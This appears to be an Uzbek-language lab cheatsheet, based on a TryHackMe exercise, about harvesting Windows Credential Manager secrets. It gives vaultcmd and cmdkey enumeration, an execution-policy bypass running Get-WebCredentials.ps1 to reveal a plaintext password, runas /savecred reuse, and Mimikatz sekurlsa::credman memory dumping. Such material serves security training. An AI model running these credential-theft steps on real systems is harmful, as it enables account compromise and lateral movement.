
### Credential Manager nima?

Credential Manager — bu Windows’ning vebsaytlar, dasturlar va tarmoqlar uchun maxfiy ma'lumotlarni saqlovchi xususiyati hisoblanadi. U foydalanuvchi nomlari, parollar va internet manzillar kabi login ma'lumotlarini o‘zida saqlaydi. Credential Manager to‘rtta toifaga bo‘linadi:

1. **Web credentials** – Veb brauzerlar yoki boshqa dasturlar tomonidan saqlangan avtorizatsiya ma'lumotlari.
2. **Windows credentials** – Windows avtorizatsiya ma'lumotlari (NTLM yoki Kerberos).
3. **Generic credentials** – Oddiy foydalanuvchi nomi va parollar kabi avtorizatsiya ma'lumotlari (aniq matnda).
4. **Certificate-based credentials** – Sertifikatlarga asoslangan avtorizatsiya ma'lumotlari.

Eslatma: Ushbu ma'lumotlar foydalanuvchining shaxsiy papkasida saqlanadi va boshqa foydalanuvchi akkauntlari bilan bo‘lishilmaydi. Ammo ular tizim xotirasida (RAM) kesh holatida bo‘ladi.

---

### Credential Manager’ga qanday kiriladi?

Credential Manager’ga GUI orqali kirish mumkin:
**Control Panel → User Accounts → Credential Manager**
Yoki **komanda satri orqali**. Bu vazifada GUI mavjud bo‘lmagan holatdagi komanda satridan foydalanamiz.

![](https://github.com/akhatkulov/cheatsheets-for-windows/blob/main/Credentials%20Harvesting/Windows%20Credential%20Manager/Windows%20Credential%20Manager.png?raw=true)

---

### Credentiallarni tekshirish (vaultcmd bilan)

1. Mavjud vault’larni ko‘rish:

```shell
C:\Users\Administrator>vaultcmd /list
```

2. Web Credential’larda ma'lumotlar bormi, tekshirish:

```shell
C:\Users\Administrator>VaultCmd /listproperties:"Web Credentials"
```

Natijada:

* Saqlangan credentiallar soni: 1
* Himoya usuli: DPAPI

3. Credential tafsilotlarini ko‘rish:

```shell
C:\Users\Administrator>VaultCmd /listcreds:"Web Credentials"
```

Natija:

* Resurs: `internal-app.thm.red`
* Foydalanuvchi: `THMUser`
* Brauzer: `MSEdge`

---

### Credentiallarni olish (PowerShell orqali)

VaultCmd parolni ko‘rsata olmaydi. Ammo `Get-WebCredentials.ps1` PowerShell skriptidan foydalanish mumkin:

```shell
C:\Users\Administrator>powershell -ex bypass
PS> Import-Module C:\Tools\Get-WebCredentials.ps1
PS> Get-WebCredentials
```

Natijada:

* Foydalanuvchi: THMUser
* Resurs: internal-app.thm.red
* Parol: `Password!`

---

### RunAs orqali Credential’lardan foydalanish

`RunAs` — Windows dasturlarini boshqa foydalanuvchi nomidan ishga tushirish imkonini beruvchi buyruq.

```shell
runas /savecred /user:THM.red\thm-local cmd.exe
```

* `/savecred` – credential’ni Credential Manager’da saqlaydi.
* `whoami` buyrug‘i orqali sessiyani kim nomidan ishga tushganini tekshirish mumkin.

---

### cmdkey orqali credentiallarni ko‘rish

```shell
C:\Users\thm>cmdkey /list
```

Natija:

* Target: `Domain:interactive=thm\thm-local`
* Foydalanuvchi: `thm\thm-local`

---

### Credentiallarni xotiradan olish (Mimikatz bilan)

Mimikatz yordamida Credential Manager’dan saqlangan ma’lumotlarni (shu jumladan aniq matndagi parollarni) xotiradan olish mumkin:

```shell
C:\Users\Administrator>c:\Tools\Mimikatz\mimikatz.exe

mimikatz # privilege::debug
mimikatz # sekurlsa::credman
```

Bu orqali Credential Manager’da saqlangan parollarni to‘g‘ridan-to‘g‘ri xotiradan chiqarib olish mumkin.

---

### Eslatma

Bu texnikalarni boshqa vositalar yordamida ham amalga oshirish mumkin:

* **Empire**
* **Metasploit**
  Qo‘shimcha bilim olish uchun ushbu vositalar haqida mustaqil o‘rganishni tavsiya qilamiz.

